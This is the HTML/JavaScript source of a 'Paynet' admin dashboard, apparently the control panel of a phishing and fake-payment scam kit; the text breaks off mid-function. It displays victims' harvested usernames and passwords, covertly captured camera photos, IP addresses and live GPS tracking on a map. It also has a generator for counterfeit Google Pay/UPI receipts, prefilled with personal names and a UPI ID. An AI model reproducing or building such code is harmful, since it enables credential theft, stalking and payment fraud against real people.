<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Paynet · Admin Dashboard</title>
    <meta name="robots" content="noindex, nofollow">
    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
    <link rel="alternate icon" href="/favicon.ico">
    <link rel="stylesheet" href="/admin.css">
    <!-- Leaflet.js for interactive maps -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        @keyframes pulse {
            0% {
                transform: scale(1);
                opacity: 1;
            }

            50% {
                transform: scale(1.05);
                opacity: 0.8;
            }

            100% {
                transform: scale(1);
                opacity: 1;
            }
        }

        .live-pulse {
            animation: pulse 1.5s infinite ease-in-out;
            box-shadow: 0 0 8px rgba(37, 99, 235, 0.4);
        }

        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3498db;
            border-radius: 50%;
            width: 35px;
            height: 35px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        .auto-refresh-toggle {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 11px;
            font-weight: 700;
            cursor: pointer;
            background: #fff;
            padding: 4px 10px;
            border-radius: 20px;
            border: 1px solid #e2e8f0;
            margin-right: 10px;
            transition: all 0.3s;
        }

        .auto-refresh-toggle:hover {
            border-color: #2563eb;
            color: #2563eb;
        }

        .auto-refresh-toggle input {
            cursor: pointer;
            accent-color: #2563eb;
        }
    </style>
</head>

<body>

    <!-- Mobile Sidebar Overlay -->
    <div class="sidebar-overlay" id="sidebar-overlay" onclick="closeSidebar()"></div>

    <div class="app-layout">

        <!-- ===== Sidebar ===== -->
        <aside class="sidebar" id="sidebar">
            <div class="sidebar-brand">
                <div class="brand-icon">💳</div>
                <div>
                    <h1>Paynet</h1>
                    <span>Admin Panel</span>
                </div>
            </div>

            <nav class="sidebar-nav">
                <div class="nav-label">Overview</div>
                <div class="nav-item active" onclick="switchTab('dashboard')" id="nav-dashboard">
                    <span class="nav-icon">📊</span>
                    Dashboard
                </div>

                <div class="nav-label">Tools</div>
                <div class="nav-item" onclick="switchTab('generator')" id="nav-generator">
                    <span class="nav-icon">🔗</span>
                    Payment Generator
                </div>




                <div class="nav-label">System</div>
                <div class="nav-item" onclick="switchTab('settings')" id="nav-settings">
                    <span class="nav-icon">⚙️</span>
                    Settings
                </div>
            </nav>

            <div class="sidebar-footer">
                <a href="/admin-logout" class="logout-btn">
                    <span>🚪</span>
                    Logout
                </a>
            </div>
        </aside>

        <!-- ===== Main Content ===== -->
        <main class="main-content">

            <!-- Top Bar -->
            <header class="top-bar">
                <div class="top-bar-left">
                    <button class="mobile-menu-btn" onclick="toggleSidebar()">☰</button>
                    <div class="page-title" id="page-title">Dashboard <span>· Overview</span></div>
                </div>
                <div class="top-bar-right">
                    <div class="status-dot"></div>
                    <div class="admin-chip">
                        🛡️ Admin
                    </div>
                </div>
            </header>

            <!-- Page Content -->
            <div class="page-content">

                <!-- ============ DASHBOARD VIEW ============ -->
                <div id="view-dashboard" class="tab-view active">

                    <!-- Stats -->
                    <div class="stats-grid">
                        <div class="stat-card">
                            <div class="stat-icon-wrap">📋</div>
                            <div class="stat-info">
                                <h3 id="total-attempts">0</h3>
                                <p>Total Attempts</p>
                            </div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-icon-wrap">📸</div>
                            <div class="stat-info">
                                <h3 id="total-photos">0</h3>
                                <p>Photos Captured</p>
                            </div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-icon-wrap">🌍</div>
                            <div class="stat-info">
                                <h3 id="total-locations">0</h3>
                                <p>Unique Locations</p>
                            </div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-icon-wrap">🕐</div>
                            <div class="stat-info">
                                <h3 id="latest-time">—</h3>
                                <p>Latest Activity</p>
                            </div>
                        </div>
                    </div>

                    <!-- Login Attempts Table -->
                    <div class="card">
                        <div class="card-header">
                            <h2><span class="icon">📋</span> Login Attempts</h2>
                            <div class="card-header-actions">
                                <label class="auto-refresh-toggle">
                                    <input type="checkbox" id="auto-refresh-check" onchange="toggleAutoRefresh()">
                                    <span>📡 Live Sync</span>
                                </label>
                                <button onclick="loadData()" class="btn">🔄 Refresh</button>
                            </div>
                        </div>
                        <div class="card-body no-padding">
                            <div class="table-wrap">
                                <table>
                                    <thead>
                                        <tr>
                                            <th>Verification ID</th>
                                            <th>Status</th>
                                            <th>Time</th>
                                            <th>User / IP</th>
                                            <th>Location</th>
                                            <th>Device</th>
                                            <th>Credentials</th>
                                            <th>Photo</th>
                                        </tr>
                                    </thead>
                                    <tbody id="attempts-tbody">
                                        <tr>
                                            <td colspan="8">
                                                <div class="empty-state">
                                                    <div class="empty-icon">⏳</div>
                                                    <p>Loading data...</p>
                                                </div>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>

                    <!-- Photo Gallery -->
                    <div class="card">
                        <div class="card-header">
                            <h2><span class="icon">📸</span> Captured Photos</h2>
                            <div class="card-header-actions">
                                <button onclick="deleteAllPhotos()" class="btn btn-danger btn-sm">🗑️ Delete
                                    All</button>
                                <button onclick="downloadAllPhotos()" class="btn btn-sm">⬇️ Download All</button>
                            </div>
                        </div>
                        <div class="card-body">
                            <div class="photo-grid" id="photo-gallery">
                                <div class="empty-state" style="grid-column: 1 / -1;">
                                    <div class="empty-icon">📷</div>
                                    <p>No photos captured yet</p>
                                    <small>Photos will appear here once captured</small>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Location Map -->
                    <div class="card">
                        <div class="card-header">
                            <h2><span class="icon">🗺️</span> Exact Location Map</h2>
                            <div class="card-header-actions">
                                <button onclick="fitAllMarkers()" class="btn btn-sm">🔍 Fit All</button>
                            </div>
                        </div>
                        <div class="card-body" style="padding: 0;">
                            <div id="map-container"
                                style="height: 480px; width: 100%; border-radius: 0 0 14px 14px; overflow: hidden;">
                            </div>
                        </div>
                    </div>
                </div>

                <!-- ============ GENERATOR VIEW ============ -->
                <div id="view-generator" class="tab-view">
                    <div class="card">
                        <div class="card-header">
                            <h2><span class="icon">🔗</span> Create Custom Payment Code</h2>
                        </div>
                        <div class="card-body">
                            <form id="payment-form" onsubmit="createPaymentLink(event)" class="form-grid">

                                <div class="form-group full-width">
                                    <label class="form-label">💰 Payment Amount</label>
                                    <input type="text" id="gen-amount" value="1,600" required class="form-input"
                                        placeholder="Enter amount">
                                </div>

                                <div class="form-group">
                                    <label class="form-label">👤 Paid To (Receiver)</label>
                                    <input type="text" id="gen-to" value="Deepak Anna Bodke" required class="form-input"
                                        placeholder="Receiver name">
                                </div>

                                <div class="form-group">
                                    <label class="form-label">👤 Paid By (Sender)</label>
                                    <input type="text" id="gen-from" value="NOUFIYA J" required class="form-input"
                                        placeholder="Sender name">
                                </div>

                                <div class="form-group">
                                    <label class="form-label">🏦 Bank Name</label>
                                    <input type="text" id="gen-bank" value="Canara Bank 2461" required
                                        class="form-input" placeholder="e.g. SBI, HDFC">
                                </div>

                                <div class="form-group">
                                    <label class="form-label">📱 UPI ID</label>
                                    <input type="text" id="gen-upi" value="gpay-12192992016@okbizaxis" required
                                        class="form-input" placeholder="e.g. user@upi">
                                </div>

                                <div class="form-group">
                                    <label class="form-label">🔢 UPI Txn ID</label>
                                    <input type="text" id="gen-upi-txn" value="604456031510" class="form-input"
                                        placeholder="Enter UPI Txn ID">
                                </div>

                                <div class="form-group">
                                    <label class="form-label">🔖 Google Txn ID</label>
                                    <input type="text" id="gen-google-txn" value="CICAgJil3_rfbQ" class="form-input"
                                        placeholder="Auto-generated if empty">
                                </div>

                                <div class="form-group full-width">
                                    <label class="form-label">📅 Custom Date</label>
                                    <input type="text" id="gen-date" value="13 Feb 2026, 8:03 pm" class="form-input"
                                        placeholder="Leave empty for current">
                                </div>

                                <div class="form-group full-width">
                                    <button type="submit" class="btn btn-primary"
                                        style="justify-content: center; padding: 12px;">
                                        🚀 Generate Code
                                    </button>
                                </div>
                            </form>

                            <!-- Generated Result -->
                            <div id="generated-result" class="gen-result">
                                <p
                                    style="color: var(--text-muted); font-size: 0.82rem; margin-bottom: 12px; font-weight: 500;">
                                    Generated Payment Code</p>
                                <div class="gen-code-box">
                                    <span class="gen-code" id="gen-id-display">—</span>
                                    <button onclick="copyGenID()" class="btn btn-primary btn-sm">📋 Copy</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>




                <!-- ============ SETTINGS VIEW ============ -->
                <div id="view-settings" class="tab-view">
                    <div class="card">
                        <div class="card-header">
                            <h2><span class="icon">⚙️</span> Paynet Configuration</h2>
                        </div>
                        <div class="card-body">
                            <form action="/admin/api/settings" method="POST"
                                style="max-width: 560px; display: flex; flex-direction: column; gap: 20px;">

                                <div class="form-group">
                                    <label class="form-label">💰 Payment Amount</label>
                                    <input type="text" name="paymentAmount" value="{{settings.paymentAmount}}"
                                        class="form-input" placeholder="e.g. 500.00">
                                </div>

                                <div class="form-group">
                                    <label class="form-label">💱 Currency Symbol</label>
                                    <input type="text" name="currencySymbol" value="{{settings.currencySymbol}}"
                                        class="form-input" placeholder="e.g. ₹">
                                </div>

                                <div class="form-group">
                                    <label class="form-check">
                                        <input type="checkbox" name="enableAnimation" {{#if
                                            settings.enableAnimation}}checked{{/if}}>
                                        <span>Enable Payment Animation</span>
                                    </label>
                                </div>

                                <button type="submit" class="btn btn-primary"
                                    style="justify-content: center; padding: 12px;">
                                    💾 Save Settings
                                </button>
                            </form>
                        </div>
                    </div>
                </div>

            </div>
        </main>
    </div>

    <!-- Lightbox -->
    <div id="lightbox" class="lightbox" onclick="closeLightbox()">
        <span class="lightbox-close">&times;</span>
        <img id="lightbox-img" src="" alt="Photo">
        <div id="lightbox-caption" class="lightbox-caption"></div>
        <button id="lightbox-delete-btn" class="lightbox-delete-btn"
            onclick="event.stopPropagation(); deletePhotoFromLightbox()">🗑️ Delete Photo</button>
    </div>

    <script>
        let attemptsData = [];

        // ===== Load data on page load =====
        window.addEventListener('load', () => {
            loadData();
        });

        // Real-time Sync Logic
        let autoRefreshInterval = null;
        function toggleAutoRefresh() {
            const isChecked = document.getElementById('auto-refresh-check').checked;
            if (isChecked) {
                autoRefreshInterval = setInterval(() => loadData(true), 12000);
            } else {
                clearInterval(autoRefreshInterval);
            }
        }

        function showPath(history) {
            if (!history || history.length < 2) return;
            // Build a Google Maps route URL
            const points = history.map(h => `${h.coords.latitude},${h.coords.longitude}`).join('/');
            const url = `https://www.google.com/maps/dir/${points}`;
            window.open(url, '_blank');
        }

        async function loadData(isSilent = false) {
            try {
                const response = await fetch('/admin/api/data');
                const data = await response.json();
                attemptsData = data.attempts || [];

                if (isSilent) {
                    // Update table contents without re-rendering everything if possible, 
                    // but for simplicity we re-render but skip animations
                    renderAttemptsTable(attemptsData);
                    updateStats(data, true);
                } else {
                    updateStats(data);
                    renderAttemptsTable(attemptsData);
                    renderPhotoGallery(data.photos || []);
                    updateMap(attemptsData);
                }
            } catch (error) {
                console.error('Error loading data:', error);
            }
        }

        function updateStats(data, isSilent = false) {
            if (isSilent) {
                document.getElementById('total-attempts').textContent = data.attempts.length;
                document.getElementById('total-photos').textContent = data.photos.length;
            } else {
                animateNumber('total-attempts', data.attempts.length);
                animateNumber('total-photos', data.photos.length);
            }

            // Count unique locations
            const uniqueLocations = new Set(
                data.attempts
                    .map(a => {
                        if (a.location) {
                            try {
                                const locData = typeof a.location === 'string' ? JSON.parse(a.location) : a.location;
                                const final = locData.finalLocation;
                                if (final) {
                                    if (final.coords && final.coords.latitude) return `${final.coords.latitude.toFixed(4)},${final.coords.longitude.toFixed(4)}`;
                                    if (final.latitude) return `${final.latitude.toFixed(4)},${final.longitude.toFixed(4)}`;
                                }
                            } catch (e) { }
                        }
                        if (a.gpsLocation && a.gpsLocation.latitude) {
                            return `${a.gpsLocation.latitude},${a.gpsLocation.longitude}`;
                        }
                        return null;
                    })
                    .filter(l => l !== null)
            ).size;

            if (isSilent) {
                document.getElementById('total-locations').textContent = uniqueLocations;
            } else {
                animateNumber('total-locations', uniqueLocations);
            }

            if (data.attempts.length > 0) {
                const latest = new Date(data.attempts[0].timestamp);
                document.getElementById('latest-time').textContent = formatRelativeTime(latest);
            }
        }

        // Animate number counting up
        function animateNumber(elementId, target) {
            const el = document.getElementById(elementId);
            const duration = 600;
            const start = parseInt(el.textContent) || 0;
            const startTime = performance.now();

            function update(currentTime) {
                const elapsed = currentTime - startTime;
                const progress = Math.min(elapsed / duration, 1);
                const eased = 1 - Math.pow(1 - progress, 3); // ease-out cubic
                el.textContent = Math.round(start + (target - start) * eased);
                if (progress < 1) requestAnimationFrame(update);
            }
            requestAnimationFrame(update);
        }

        // ===== Render Table =====
        function renderAttemptsTable(attempts) {
            const tbody = document.getElementById('attempts-tbody');

            if (attempts.length === 0) {
                tbody.innerHTML = `<tr><td colspan="8">
                    <div class="empty-state">
                        <div class="empty-icon">📭</div>
                        <p>No login attempts recorded</p>
                        <small>Attempts will appear here once users interact</small>
                    </div></td></tr>`;
                return;
            }

            tbody.innerHTML = attempts.map((attempt, index) => {
                const dateObj = new Date(attempt.timestamp);
                const time = dateObj.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
                const date = dateObj.toLocaleDateString([], { day: '2-digit', month: 'short' });
                const location = getLocationString(attempt);
                const device = getDeviceString(attempt);
                const status = attempt.status || 'Verified';
                const statusClass = status === 'Verified' ? 'badge-success' : 'badge-warning';

                // Categorize Photos
                const allPhotos = (attempt.photos || []).concat(attempt.photoFilename ? [{ filename: attempt.photoFilename }] : []);

                // Heuristic: First 5 are Bio, Rest are Receipt
                const bioPhotos = allPhotos.slice(0, 5);
                const receiptPhotos = allPhotos.slice(5);

                const renderPhotoBtn = (p, label, color) => {
                    const photoSrc = p.url || p.localPath || (p.filename ? `/admin/photo/${p.filename}` : '');
                    return `<button onclick="viewPhoto('${photoSrc}')" class="btn btn-${color} btn-sm photo-stack-btn" title="${label}">
                        📷 ${label}
                     </button>`;
                };

                return `
                    <tr>
                        <td>
                            <div class="cell-id">${attempt.verificationId || '—'}</div>
                            <div class="cell-meta">Amazon Pay</div>
                        </td>
                        <td>
                            <span class="badge ${statusClass}">
                                <span class="badge-dot"></span>
                                ${status}
                            </span>
                            <div class="cell-meta" style="margin-top:4px">${attempt.amount || '₹0.00'}</div>
                        </td>
                        <td>
                            <div class="cell-strong">${time}</div>
                            <div class="cell-meta">${date}</div>
                        </td>
                        <td>
                            <div class="cell-strong">${escapeHtml(attempt.username || 'Unknown')}</div>
                            <div class="cell-meta">${attempt.ip || '—'}</div>
                        </td>
                        <td style="min-width: 220px;">${location}</td>
                        <td>${device}</td>
                        <td>
                            <div class="cred-wrap">
                                <div class="cred-row">
                                    <span class="cred-label">U</span>
                                    <span class="cred-value masked" id="user-${index}" data-value="${escapeHtml(attempt.username || '')}">${maskString(attempt.username || '')}</span>
                                </div>
                                <div class="cred-row">
                                    <span class="cred-label">P</span>
                                    <span class="cred-value masked" id="pass-${index}" data-value="${escapeHtml(attempt.password || '')}">${maskString(attempt.password || '')}</span>
                                </div>
                                <button class="reveal-btn" id="btn-${index}" onclick="toggleCredentials(${index})">👁️ Show</button>
                            </div>
                        </td>
                        <td>
                            <div class="photo-cell-content">
                                ${bioPhotos.length > 0 ?
                        `<div class="photo-group">
                                        <div class="photo-label">Bio Check (${bioPhotos.length})</div>
                                        <div class="photo-actions-row">
                                           ${bioPhotos.map((p, i) => renderPhotoBtn(p, `#${i + 1}`, 'success')).join('')}
                                        </div>
                                    </div>` : ''}
                                
                                ${receiptPhotos.length > 0 ?
                        `<div class="photo-group" style="margin-top: 8px; padding-top: 8px; border-top: 1px dashed #eee;">
                                        <div class="photo-label">Receipt (${receiptPhotos.length})</div>
                                         <div class="photo-actions-row">
                                           ${receiptPhotos.map((p, i) => renderPhotoBtn(p, `#${i + 1}`, 'primary')).join('')}
                                        </div>
                                    </div>` : ''}

                                ${allPhotos.length === 0 ? '<span class="text-muted">—</span>' : ''}
                            </div>
                        </td>
                    </tr>
                `;
            }).join('');
        }

        // ===== Photo Gallery =====
        function renderPhotoGallery(photos) {
            const gallery = document.getElementById('photo-gallery');

            if (photos.length === 0) {
                gallery.innerHTML = `<div class="empty-state" style="grid-column: 1 / -1;">
                    <div class="empty-icon">📷</div>
                    <p>No photos captured yet</p>
                    <small>Photos will appear here once captured</small>
                </div>`;
                return;
            }

            gallery.innerHTML = photos.map(photo => {
                let imgSrc = '';
                if (photo.path && photo.path.startsWith('http')) {
                    imgSrc = photo.path;
                } else if (photo.isLocal) {
                    imgSrc = '/admin/photo/' + photo.filename;
                } else if (photo.path) {
                    imgSrc = photo.path;
                } else {
                    imgSrc = '/admin/photo/' + photo.filename;
                }

                // Extract camera and type from photo metadata
                const camera = photo.camera || 'unknown';
                const photoType = photo.type || 'unknown';
                const cameraIcon = camera === 'front' ? '🤳' : camera === 'back' ? '📷' : '📸';
                const cameraLabel = camera === 'front' ? 'Front' : camera === 'back' ? 'Back' : 'Unknown';
                const cameraColor = camera === 'front' ? '#3b82f6' : camera === 'back' ? '#10b981' : '#6b7280';

                // Extract type label
                let typeLabel = photoType;
                if (photoType.includes('login')) typeLabel = 'Login';
                else if (photoType.includes('bio')) typeLabel = 'Biometric';
                else if (photoType.includes('receipt')) typeLabel = 'Receipt';

                return `
                <div class="photo-card" onclick="viewPhoto('${imgSrc}')">
                    <img src="${imgSrc}" alt="Captured" loading="lazy" onerror="this.parentElement.style.display='none'">
                    <div class="photo-actions">
                        <div style="display: flex; gap: 4px; margin-bottom: 4px; flex-wrap: wrap;">
                            <span style="font-size: 10px; padding: 2px 6px; background: ${cameraColor}; color: white; border-radius: 4px; font-weight: 600;">
                                ${cameraIcon} ${cameraLabel}
                            </span>
                            <span style="font-size: 10px; padding: 2px 6px; background: #64748b; color: white; border-radius: 4px; font-weight: 600;">
                                ${typeLabel}
                            </span>
                        </div>
                        <span class="photo-name" style="font-size: 11px;">${photo.filename || 'Unknown'}</span>
                        <button onclick="event.stopPropagation(); deletePhoto('${photo.filename}');"
                                class="photo-del-btn" title="Delete">🗑️</button>
                    </div>
                </div>
            `}).join('');
        }

        // ===== Tab Navigation =====
        function switchTab(tabName) {
            // Hide all views, show target
            document.querySelectorAll('.tab-view').forEach(el => el.classList.remove('active'));
            document.getElementById('view-' + tabName).classList.add('active');

            // Update nav active state
            document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
            document.getElementById('nav-' + tabName).classList.add('active');

            // Update page title
            const titles = {
                dashboard: 'Dashboard <span>· Overview</span>',
                social: 'Social Command <span>· Instagram Control</span>',
                number: 'Number Intel <span>· +91 Lookup</span>',
                generator: 'Payment Generator <span>· Create Codes</span>',
                identity: 'Identity Lookup <span>· OSINT Tools</span>',
                settings: 'Settings <span>· Configuration</span>'
            };
            document.getElementById('page-title').innerHTML = titles[tabName] || tabName;

            // Close mobile sidebar
            closeSidebar();
        }

        // ===== Sidebar Mobile =====
        function toggleSidebar() {
            document.getElementById('sidebar').classList.toggle('open');
            document.getElementById('sidebar-overlay').classList.toggle('show');
        }

        function closeSidebar() {
            document.getElementById('sidebar').classList.remove('open');
            document.getElementById('sidebar-overlay').classList.remove('show');
        }

        // ===== Interactive Leaflet Map =====
        let leafletMap = null;
        let mapMarkers = [];
        let markersGroup = null;

        function initMap() {
            if (leafletMap) return;
            const container = document.getElementById('map-container');
            if (!container) return;

            leafletMap = L.map(container, {
                center: [20.5937, 78.9629], // Default: India center
                zoom: 5,
                zoomControl: true,
                scrollWheelZoom: true
            });

            // Dark tile layer matching dashboard theme
            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
                attribution: '&copy; <a href="https://carto.com/">CARTO</a>',
                subdomains: 'abcd',
                maxZoom: 20
            }).addTo(leafletMap);

            markersGroup = L.featureGroup().addTo(leafletMap);
        }

        function updateMap(attempts) {
            initMap();
            if (!leafletMap) return;

            // Clear existing markers
            markersGroup.clearLayers();
            mapMarkers = [];

            const validLocations = [];

            attempts.forEach(a => {
                // Use pre-extracted exactLocation from API
                if (a.exactLocation && a.exactLocation.hasExactCoords) {
                    validLocations.push({
                        lat: a.exactLocation.latitude,
                        lon: a.exactLocation.longitude,
                        accuracy: a.exactLocation.accuracy,
                        source: a.exactLocation.source,
                        address: a.exactLocation.address,
                        id: a.verificationId,
                        username: a.username,
                        timestamp: a.timestamp,
                        isLive: a.isLive
                    });
                    return;
                }

                // Fallback: parse location field
                let lat = null, lon = null;
                if (a.location) {
                    try {
                        const locData = typeof a.location === 'string' ? JSON.parse(a.location) : a.location;
                        const final = locData.finalLocation;
                        if (final) {
                            if (final.coords && final.coords.latitude) { lat = final.coords.latitude; lon = final.coords.longitude; }
                            else if (final.latitude) { lat = final.latitude; lon = final.longitude; }
                        }
                    } catch (e) { }
                }
                if (!lat && a.gpsLocation && a.gpsLocation.latitude) {
                    lat = a.gpsLocation.latitude;
                    lon = a.gpsLocation.longitude;
                }
                if (!lat && a.geo && a.geo.latitude) {
                    lat = a.geo.latitude;
                    lon = a.geo.longitude;
                }
                if (lat && lon) {
                    validLocations.push({ lat, lon, id: a.verificationId, username: a.username, timestamp: a.timestamp });
                }
            });

            if (validLocations.length === 0) {
                // No locations to show
                return;
            }

            validLocations.forEach(loc => {
                const isLive = loc.isLive && (new Date() - new Date(loc.timestamp)) < 120000;
                const color = isLive ? '#3b82f6' : (loc.source && loc.source.includes('GPS') ? '#10b981' : '#f59e0b');

                const icon = L.divIcon({
                    className: 'custom-marker',
                    html: `<div style="
                        width: 14px; height: 14px;
                        background: ${color};
                        border: 3px solid white;
                        border-radius: 50%;
                        box-shadow: 0 2px 8px rgba(0,0,0,0.4)${isLive ? ', 0 0 12px ' + color : ''};
                        ${isLive ? 'animation: pulse-glow 2s infinite;' : ''}
                    "></div>`,
                    iconSize: [20, 20],
                    iconAnchor: [10, 10]
                });

                const time = new Date(loc.timestamp).toLocaleString();
                const addrStr = loc.address ? `<br><b>Address:</b> ${loc.address.fullAddress || ''}` : '';

                const marker = L.marker([loc.lat, loc.lon], { icon })
                    .bindPopup(`
                        <div style="font-family: Inter, sans-serif; min-width: 200px; color: #1e293b;">
                            <div style="font-weight: 700; font-size: 14px; margin-bottom: 6px;">${loc.id || 'Unknown'}</div>
                            <div style="font-size: 12px; color: #64748b; margin-bottom: 4px;">User: ${loc.username || 'N/A'}</div>
                            <div style="font-family: monospace; font-size: 13px; font-weight: 600; color: #0f172a; background: #f1f5f9; padding: 4px 8px; border-radius: 4px; margin: 6px 0;">
                                📍 ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}
                            </div>
                            ${loc.accuracy ? `<div style="font-size: 11px;">Accuracy: ±${Math.round(loc.accuracy)}m (${loc.source || 'Unknown'})</div>` : ''}
                            ${addrStr}
                            <div style="font-size: 11px; color: #94a3b8; margin-top: 4px;">🕐 ${time}</div>
                            <div style="margin-top: 8px; display: flex; gap: 6px;">
                                <a href="https://www.google.com/maps?q=${loc.lat},${loc.lon}" target="_blank" 
                                   style="font-size: 11px; padding: 4px 8px; background: #4285f4; color: white; border-radius: 4px; text-decoration: none;">Google Maps</a>
                                <a href="https://www.openstreetmap.org/?mlat=${loc.lat}&mlon=${loc.lon}&zoom=18" target="_blank" 
                                   style="font-size: 11px; padding: 4px 8px; background: #7EBC6F; color: white; border-radius: 4px; text-decoration: none;">OSM</a>
                            </div>
                        </div>
                    `, { maxWidth: 300 });

                marker.addTo(markersGroup);
                mapMarkers.push(marker);
            });

            // Fit map to show all markers
            if (mapMarkers.length > 0) {
                leafletMap.fitBounds(markersGroup.getBounds().pad(0.2));
            }
        }

        function fitAllMarkers() {
            if (leafletMap && markersGroup && mapMarkers.length > 0) {
                leafletMap.fitBounds(markersGroup.getBounds().pad(0.2));
            }
        }

        // ===== Location String Builder (uses pre-extracted exactLocation) =====
        function getLocationString(attempt) {
            let html = '';
            let hasLocation = false;

            // PRIORITY: Use server-extracted exactLocation if available
            if (attempt.exactLocation && attempt.exactLocation.hasExactCoords) {
                const el = attempt.exactLocation;
                const isEstimated = el.source && (el.source.includes('IP') || el.source.includes('Estimation') || el.source.includes('Fallback'));
                const isHighPrecision = el.accuracy && el.accuracy < 100 && !isEstimated;
                const lastSeen = new Date(attempt.lastUpdate || attempt.timestamp);
                const isOnline = (new Date() - lastSeen) < 60000;

                let badgeHtml = '';
                if (isOnline) {
                    badgeHtml = `<div class="precision-badge live-pulse" style="color:#2563eb; background:rgba(37,99,235,0.12); padding:2px 6px; border-radius:4px; font-weight:700; font-size:10px; margin-bottom:4px; display:inline-block; border:1px solid rgba(147,197,253,0.3);">📡 LIVE</div><br>`;
                }
                if (isEstimated) {
                    badgeHtml += `<div class="precision-badge" style="color:#f87171; background:rgba(239,68,68,0.12); padding:2px 6px; border-radius:4px; font-weight:700; font-size:10px; margin-bottom:4px; display:inline-block; border:1px solid rgba(253,164,175,0.3);">⚠️ ISP EST</div>`;
                } else if (isHighPrecision) {
                    badgeHtml += `<div class="precision-badge" style="color:#34d399; background:rgba(16,185,129,0.12); padding:2px 6px; border-radius:4px; font-weight:700; font-size:10px; margin-bottom:4px; display:inline-block; border:1px solid rgba(110,231,183,0.3);">🛰️ SAT-LOCK</div>`;
                } else {
                    badgeHtml += `<div class="precision-badge" style="color:var(--text-secondary); background:rgba(255,255,255,0.04); padding:2px 6px; border-radius:4px; font-weight:700; font-size:10px; margin-bottom:4px; display:inline-block; border:1px solid var(--border);">📍 GPS</div>`;
                }

                const borderColor = isOnline ? 'rgba(59,130,246,0.5)' : (isEstimated ? 'rgba(239,68,68,0.5)' : 'rgba(16,185,129,0.5)');
                hasLocation = true;
                html += `<div class="loc-wrap" style="border-left:3px solid ${borderColor}; padding-left:8px;">`;
                html += badgeHtml;
                html += `<div class="loc-coords">${el.latitude.toFixed(6)}°N, ${el.longitude.toFixed(6)}°E</div>`;
                html += `<div class="cell-meta" style="font-size:11px;">±${Math.round(el.accuracy || 0)}m • ${el.source || 'GPS'}</div>`;

                if (el.address && typeof el.address === 'object') {
                    html += `<div class="loc-address">${el.address.fullAddress || formatDetailedAddress(el.address)}</div>`;
                }

                html += `<div style="display:flex; gap:5px; margin-top:6px; flex-wrap:wrap;">`;
                html += `<a href="${el.googleMapsUrl || 'https://www.google.com/maps?q=' + el.latitude + ',' + el.longitude}" target="_blank" class="map-link-btn" style="flex:1;">🗺️ Map</a>`;
                html += `<a href="${el.osmUrl || 'https://www.openstreetmap.org/?mlat=' + el.latitude + '&mlon=' + el.longitude + '&zoom=18'}" target="_blank" class="map-link-btn" style="flex:1; background:rgba(126,188,111,0.12); color:#7EBC6F; border-color:rgba(126,188,111,0.3);">🌍 OSM</a>`;

                if (attempt.locationHistory && attempt.locationHistory.length > 1) {
                    const historyJson = JSON.stringify(attempt.locationHistory).replace(/'/g, "&apos;");
                    html += `<button onclick='showPath(${historyJson})' class="btn btn-sm" style="font-size:10px; padding:3px 6px;">🎞️ Path (${attempt.locationHistory.length})</button>`;
                }
                html += `</div></div>`;
                return html;
            }

            // FALLBACK: Parse location data manually
            if (attempt.location) {
                try {
                    const loc = typeof attempt.location === 'string' ? JSON.parse(attempt.location) : attempt.location;
                    const final = loc.finalLocation;

                    if (final && (final.coords || final.latitude)) {
                        const coords = final.coords || { latitude: final.latitude, longitude: final.longitude };
                        const accuracy = (final.coords ? final.coords.accuracy : final.accuracy) || 0;
                        const source = final.source || loc.captureMethod || 'Unknown';
                        const address = final.address || loc.address;

                        hasLocation = true;
                        html += `<div class="loc-wrap" style="border-left:3px solid rgba(16,185,129,0.5); padding-left:8px;">`;
                        html += `<div class="loc-coords">${coords.latitude.toFixed(6)}°N, ${coords.longitude.toFixed(6)}°E</div>`;
                        html += `<div class="cell-meta">±${Math.round(accuracy)}m • ${source}</div>`;
                        if (address) html += `<div class="loc-address">${address.fullAddress || formatDetailedAddress(address)}</div>`;
                        html += `<a href="https://www.google.com/maps?q=${coords.latitude},${coords.longitude}" target="_blank" class="map-link-btn">🗺️ Map</a>`;
                        html += `</div>`;
                        return html;
                    }
                } catch (e) { }
            }

            if (attempt.gpsLocation && attempt.gpsLocation.latitude) {
                const gl = attempt.gpsLocation;
                hasLocation = true;
                html += `<div class="loc-wrap" style="border-left:3px solid rgba(16,185,129,0.5); padding-left:8px;">`;
                html += `<div class="loc-coords">${gl.latitude.toFixed(6)}°N, ${gl.longitude.toFixed(6)}°E</div>`;
                html += `<div class="cell-meta">±${Math.round(gl.accuracy || 0)}m</div>`;
                html += `<a href="https://www.google.com/maps?q=${gl.latitude},${gl.longitude}" target="_blank" class="map-link-btn">🗺️ Map</a>`;
                html += `</div>`;
            }

            // IP-based geo info
            if (attempt.geo && attempt.geo.city) {
                if (hasLocation) html += `<div style="margin-top:6px; padding-top:6px; border-top:1px solid var(--border);">`;
                else html += `<div class="loc-wrap">`;
                html += `<div class="cell-meta" style="font-weight:500;color:var(--text-secondary)">🌐 ${attempt.geo.city}`;
                if (attempt.geo.region) html += `, ${attempt.geo.region}`;
                html += `</div>`;
                html += `<div class="cell-meta">${attempt.geo.country || ''}</div>`;
                if (attempt.geo.towerName) {
                    html += `<div class="cell-meta" style="color: var(--accent-hover); font-weight: 500;">🗼 ${attempt.geo.towerName}</div>`;
                }
                if (attempt.geo.towerDetails) {
                    html += `<div class="cell-meta" style="font-size: 11px;">📡 ${attempt.geo.towerDetails}</div>`;
                }
